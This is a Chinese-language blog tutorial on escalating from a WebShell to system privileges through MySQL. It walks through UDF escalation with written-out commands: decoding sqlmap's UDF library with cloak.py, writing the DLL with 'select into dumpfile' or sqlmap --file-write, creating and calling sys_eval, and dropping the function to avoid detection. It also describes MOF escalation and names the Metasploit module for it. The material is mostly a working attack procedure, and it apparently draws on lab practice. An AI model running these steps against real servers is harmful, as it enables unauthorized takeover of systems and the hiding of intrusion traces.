<h4 class="md-end-block md-heading"><span class="md-plain">一、提权前提与核心条件</span></h4>
<h5 class="md-end-block md-heading"><span class="md-plain">（一）适用场景</span></h5>
<p class="md-end-block md-p"><span class="md-plain">当已获取 WebShell 但缺乏系统级权限，且其他提权方式（如内核漏洞、配置错误）不可行时，可尝试通过 MySQL 数据库提权。</span></p>

<h5 class="md-end-block md-heading"><span class="md-plain">（二）核心要求</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">必须掌握高权限数据库用户的账号密码（如</span><span class="md-pair-s" spellcheck="false"><code>root</code></span><span class="md-plain">权限），具备执行文件操作、配置修改等高级权限。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">目标服务器需允许数据库用户与文件系统交互（如</span><span class="md-pair-s" spellcheck="false"><code>secure_file_priv</code></span><span class="md-plain">配置未严格限制）。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">二、通过数据库提升系统权限</span></h4>
<p class="md-end-block md-p"><span class="md-plain">利用 MySQL 的扩展功能（如自定义函数、系统特性）执行系统命令，获取操作系统权限。</span></p>

<h5 class="md-end-block md-heading"><span class="md-plain">（一）UDF 提权（用户自定义函数提权）</span></h5>
<p class="md-end-block md-p"><span class="md-plain">通过上传恶意动态链接库（</span><span class="md-pair-s" spellcheck="false"><code>.dll</code></span><span class="md-plain">或</span><span class="md-pair-s" spellcheck="false"><code>.so</code></span><span class="md-plain">），创建可执行系统命令的自定义函数，实现权限提升。</span></p>

<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">核心原理</span></strong></span><span class="md-plain">：</span> <span class="md-plain">UDF（User-Defined Function）允许用户自定义 MySQL 函数，若函数指向恶意动态链接库，可调用系统命令（如</span><span class="md-pair-s" spellcheck="false"><code>whoami</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>ipconfig</code></span><span class="md-plain">），从而以 MySQL 服务权限执行操作。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">操作流程</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p md-focus"><span class="md-pair-s"><strong><span class="md-plain">确定动态链接库路径</span></strong></span><span class="md-plain">：</span> <span class="md-plain">执行以下命令获取</span><span class="md-pair-s" spellcheck="false"><code>plugin_dir</code></span><span class="md-plain">（插件目录，动态链接库必须放入此目录）：</span></p>



```sql
show variables like "%plugin%";  # 如结果为D:/mysql/lib/plugin/
```


<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">版本差异</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">MySQL 5.1 及以上：必须放入</span><span class="md-pair-s" spellcheck="false"><code>plugin_dir</code></span><span class="md-plain">目录（默认可能不存在，需手动创建）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">MySQL 5.1 以下：可放入</span><span class="md-pair-s" spellcheck="false"><code>C:/Windows/System32</code></span><span class="md-plain">目录。</span></p>
</li>
</ul>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">获取并处理恶意 DLL</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">使用 sqlmap 自带的 UDF 库（路径：</span><span class="md-pair-s" spellcheck="false"><code>sqlmap/data/udf/mysql/</code></span><span class="md-plain">，区分 Windows/Linux 和 32/64 位）。</span></p>
<p class="md-end-block md-p"><span class="md-image md-img-loaded" data-src="./image-20250711152136573.png"><img class="alignnone size-full wp-image-808" src="/wp-content/uploads/2025/img-9f259b22083c.png" alt="" width="900" height="189" /></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">解码处理：sqlmap 的动态链接库为防查杀经过编码，需用</span><span class="md-pair-s" spellcheck="false"><code>cloak.py</code></span><span class="md-plain">解码（原始文件带</span><span class="md-pair-s" spellcheck="false"><code>_</code></span><span class="md-plain">后缀）：</span></p>
<p class="md-end-block md-p"><span class="md-image md-img-loaded" data-src="./image-20250711152128373.png"><img class="alignnone size-full wp-image-809" src="/wp-content/uploads/2025/img-5ea7d32e1d4d.png" alt="" width="934" height="210" /></span></p>



```bash
# Windows解码示例
python cloak.py -d -i 路径\lib_mysqludf_sys.dll_ -o udf.dll
# Linux解码示例
python cloak.py -d -i 路径\lib_mysqludf_sys.so_ -o udf.so
```


</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">上传 DLL 到目标路径</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">方法 1</span></strong></span><span class="md-plain">：通过 WebShell 直接上传到</span><span class="md-pair-s" spellcheck="false"><code>plugin_dir</code></span><span class="md-plain">。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">方法 2</span></strong></span><span class="md-plain">：通过</span><span class="md-pair-s" spellcheck="false"><code>select into dumpfile</code></span><span class="md-plain">命令写入（需将 DLL 转换为十六进制）：</span></p>



```bash
select 0x[DLL十六进制编码] into dumpfile 'D:/mysql/lib/plugin/udf.dll';
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">方法 3</span></strong></span><span class="md-plain">：利用 sqlmap 自动上传：</span></p>



```bash
sqlmap -u "http://目标IP/sqli-labs/Less-1/?id=1" --file-write="本地DLL路径" --file-dest="plugin_dir/udf.dll"
```


</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">创建并调用函数</span></strong></span><span class="md-plain">：</span></p>



```bash
# 创建执行系统命令的函数
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';
​
# 执行命令（如查看当前用户）
select sys_eval('whoami');  # 成功返回系统用户（如administrator）
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">清理痕迹</span></strong></span><span class="md-plain">：</span></p>



```bash
drop function sys_eval;  # 删除自定义函数，避免被发现
```


</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">注意事项</span></strong></span><span class="md-plain">：若 MySQL 以</span><span class="md-pair-s" spellcheck="false"><code>system</code></span><span class="md-plain">权限运行（如注册为系统服务），提权后可获得</span><span class="md-pair-s" spellcheck="false"><code>NT AUTHORITY\SYSTEM</code></span><span class="md-plain">权限；否则仅能获得 MySQL 服务用户权限（如</span><span class="md-pair-s" spellcheck="false"><code>mysql</code></span><span class="md-plain">）。</span></p>
</li>
</ol>
<h5 class="md-end-block md-heading"><span class="md-plain">（二）MOF 提权（局限性较大）</span></h5>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">原理</span></strong></span><span class="md-plain">：</span> <span class="md-plain">利用 Windows 系统定期执行</span><span class="md-pair-s" spellcheck="false"><code>C:\Windows\System32\wbem\mof</code></span><span class="md-plain">目录下</span><span class="md-pair-s" spellcheck="false"><code>.mof</code></span><span class="md-plain">文件的特性，通过写入恶意 MOF 文件，以系统权限执行命令（如添加管理员用户）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">适用范围</span></strong></span><span class="md-plain">：</span> <span class="md-plain">仅支持 Windows Server 2003 及更早版本，现代系统（如 Win7、Win10、Server 2008+）已修复此漏洞，实际利用价值极低。</span></p>
</li>
 	<li class="md-list-item md-focus-container">
<p class="md-end-block md-p md-focus"><span class="md-pair-s "><strong><span class="md-plain">操作提示</span></strong></span><span class="md-plain">：</span> <span class="md-plain">MSF 提供现成模块</span><span class="md-pair-s" spellcheck="false"><code>exploit/windows/mysql/mysql_mof</code></span><span class="md-plain md-expand">，但需满足严格的系统版本和权限条件，成功率较低。</span></p>
</li>
</ol>
